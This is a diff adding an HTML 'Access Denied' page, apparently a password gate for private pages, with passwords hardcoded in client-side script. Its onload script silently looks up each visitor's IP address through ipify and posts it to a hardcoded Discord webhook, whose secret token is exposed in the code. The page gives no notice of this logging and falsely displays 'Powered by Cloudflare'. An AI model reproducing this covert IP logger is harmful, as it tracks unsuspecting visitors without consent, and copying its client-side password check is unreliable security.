@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+  <head>
+        <title>ServerSelect</title>
+    <style>
+      h1 {
+  /* Prefix required. Even Firefox only supports the -webkit- prefix */
+  -webkit-text-stroke-width: 1px;
+  -webkit-text-stroke-color: black;
+      }
+      body {
+        background: linear-gradient(to right, #224675, #4d0d7a);
+        color: white;
+        font-family: 'Custom Font', sans-serif;
+      }
+      
+    </style>
+    <script>
+      function redirect() {
+        var password = prompt("Enter your password:");
+        if (password == "ticklemypickle")/* Enter a custom password here */{
+          window.location.href = "./EXP.html";
+        } else if (password == "rafeprivate")/* Cool password that only you know that has private stuff or whatever */ {
+          window.location.href = "./main/roblox.html";
+        } else if (password == "ticklemypickle") {
+          window.location.href = "./EXP.html";
+        } else {
+          alert("Incorrect password");
+        }
+      }
+    </script>
+      <script>
+    window.onload = function() {
+      // Get the visitor's IP address
+      fetch("https://api.ipify.org?format=json")
+        .then(response => response.json())
+        .then(data => {
+          const userIp = data.ip;
+
+          // Discord webhook URL
+          const webhookUrl = "https://discord.com/api/webhooks/1073270836968042546/dVAxy8_49eprY_BKlNk1A30XPctMQAGjrocYHA05kpX7SJUnx_QDhlwaiMa0CL0IX25G";
+
+          // Payload that will be sent to the webhook
+          const payload = {
+            content: `Visitor's IP address: ${userIp}`
+          };
+
+          // Send the payload to the webhook
+          fetch(webhookUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+          })
+            .then(response => console.log("Payload sent successfully."))
+            .catch(error => console.error("Error sending payload: ", error));
+        });
+    };
+  </script>
+  </head>
+  <body onload="redirect()">
+    <center><h1 style="color: white">Access Denied</h1style="color: Red"></center>
+    <center><p style="color: lightgreen">You are attempting to visit a private page and If you ask me the pascode im not gonna give it to you</p></center>
+  <center><button onClick="window.location.reload();">Refresh Page</button></center>
+    <center><p style="color: blueviolet">discord.gg/CvxBQQdXhV</p></center>
+    <center><p style="color: Orange"> Powered by Cloudflare</p></center>
+    <center><p style="color: grey">FileProxy</p></center>
+  </body>
+</html>
